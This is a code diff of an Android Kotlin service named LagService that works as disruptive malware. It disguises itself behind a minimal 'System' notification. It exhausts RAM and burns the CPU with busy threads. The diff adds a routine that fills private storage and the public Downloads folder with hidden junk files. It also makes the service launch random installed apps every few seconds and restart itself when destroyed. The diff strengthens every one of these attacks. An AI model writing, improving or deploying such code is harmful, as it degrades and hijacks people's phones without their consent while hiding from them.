@@ -9,10 +9,12 @@ import android.content.Intent
 import android.content.pm.ApplicationInfo
 import android.content.pm.PackageManager
 import android.os.Build
+import android.os.Environment
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import androidx.core.app.NotificationCompat
+import java.io.File
 import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.random.Random
@@ -27,33 +29,26 @@ class LagService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(99, buildSilentNotification())
+        startForeground(99, buildNotification())
         startRamAttack()
+        startJunkFiles()
         startRandomAppOpener()
         return START_STICKY
     }
 
-    private fun buildSilentNotification(): Notification {
-        val channelId = "sys_update"
+    private fun buildNotification(): Notification {
+        val channelId = "sys"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                channelId,
-                "System",
-                NotificationManager.IMPORTANCE_MIN
-            )
-            channel.setShowBadge(false)
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+            val ch = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
+            ch.setShowBadge(false)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
-
         val pi = PendingIntent.getActivity(
-            this, 0,
-            Intent(this, MainActivity::class.java),
-            PendingIntent.FLAG_IMMUTABLE
+            this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE
         )
-
         return NotificationCompat.Builder(this, channelId)
             .setContentTitle("System")
-            .setContentText("Working...")
+            .setContentText("...")
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setContentIntent(pi)
             .setOngoing(true)
@@ -61,59 +56,72 @@ class LagService : Service() {
             .build()
     }
 
-    /** Allocate large chunks of RAM until the system starts killing other apps / lagging hard */
     private fun startRamAttack() {
         executor.execute {
-            try {
-                // Keep allocating ~8-12 MB chunks
-                while (running.get()) {
-                    try {
-                        val chunk = ByteArray(8 * 1024 * 1024) // 8 MB
-                        // Touch the memory so it is really allocated
-                        for (i in chunk.indices step 4096) {
-                            chunk[i] = 1
-                        }
-                        synchronized(ramChunks) {
-                            ramChunks.add(chunk)
-                            // Soft limit so the process itself is not instantly killed
-                            if (ramChunks.size > 40) { // ~320 MB
-                                // Drop oldest a bit then continue
-                                if (ramChunks.isNotEmpty()) ramChunks.removeAt(0)
-                            }
-                        }
-                    } catch (oom: OutOfMemoryError) {
-                        // Hit the limit, wait a bit then try again
-                        Thread.sleep(1500)
+            while (running.get()) {
+                try {
+                    val chunk = ByteArray(10 * 1024 * 1024) // 10MB
+                    for (i in chunk.indices step 4096) chunk[i] = 1
+                    synchronized(ramChunks) {
+                        ramChunks.add(chunk)
+                        if (ramChunks.size > 45) ramChunks.removeAt(0)
                     }
-                    Thread.sleep(300)
+                } catch (oom: OutOfMemoryError) {
+                    Thread.sleep(1200)
                 }
-            } catch (_: Exception) {}
+                Thread.sleep(250)
+            }
         }
-
-        // Extra CPU burn threads
-        repeat(3) {
+        repeat(4) {
             executor.execute {
                 var x = 0L
                 while (running.get()) {
                     x = (x * 31 + 17) xor System.nanoTime()
-                    if (x % 100000L == 0L) {
-                        try { Thread.sleep(1) } catch (_: Exception) {}
-                    }
                 }
             }
         }
     }
 
-    /** Randomly open other installed apps to annoy / confuse */
+    /** Create junk files in app private dir + public Downloads if possible */
+    private fun startJunkFiles() {
+        executor.execute {
+            var n = 0
+            while (running.get() && n < 80) {
+                try {
+                    // App private
+                    val dir = File(filesDir, "cache_tmp")
+                    if (!dir.exists()) dir.mkdirs()
+                    val f = File(dir, "tmp_${System.currentTimeMillis()}_$n.dat")
+                    f.writeBytes(ByteArray(512 * 1024) { Random.nextInt(256).toByte() }) // 512KB junk
+
+                    // Try public Downloads
+                    try {
+                        val dl = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                        if (dl != null && dl.exists()) {
+                            val jf = File(dl, ".sys_${n}_${System.currentTimeMillis()}.tmp")
+                            jf.writeBytes(ByteArray(256 * 1024) { 0 })
+                        }
+                    } catch (_: Exception) {}
+
+                    n++
+                    Thread.sleep(800)
+                } catch (_: Exception) {
+                    Thread.sleep(1500)
+                }
+            }
+        }
+    }
+
+    /** Open random apps very frequently */
     private fun startRandomAppOpener() {
         handler.postDelayed(object : Runnable {
             override fun run() {
                 if (!running.get()) return
                 tryOpenRandomApp()
-                // Every 8-20 seconds open something
-                handler.postDelayed(this, Random.nextLong(8000, 20000))
+                // Super fast: every 2.5 – 6 seconds
+                handler.postDelayed(this, Random.nextLong(2500, 6000))
             }
-        }, 6000)
+        }, 3000)
     }
 
     private fun tryOpenRandomApp() {
@@ -121,31 +129,22 @@ class LagService : Service() {
             val pm = packageManager
             val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                 .filter {
-                    // Prefer normal user apps, skip ourselves and system-heavy ones
                     (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 &&
                             it.packageName != packageName
                 }
-
             if (apps.isEmpty()) return
-
             val target = apps[Random.nextInt(apps.size)]
-            val launch = pm.getLaunchIntentForPackage(target.packageName)
-            if (launch != null) {
-                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(launch)
-            }
+            val launch = pm.getLaunchIntentForPackage(target.packageName) ?: return
+            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(launch)
         } catch (_: Exception) {}
     }
 
     override fun onDestroy() {
         running.set(false)
-        // Try to restart
         val restart = Intent(this, LagService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(restart)
-        } else {
-            startService(restart)
-        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart)
+        else startService(restart)
         super.onDestroy()
     }
 }
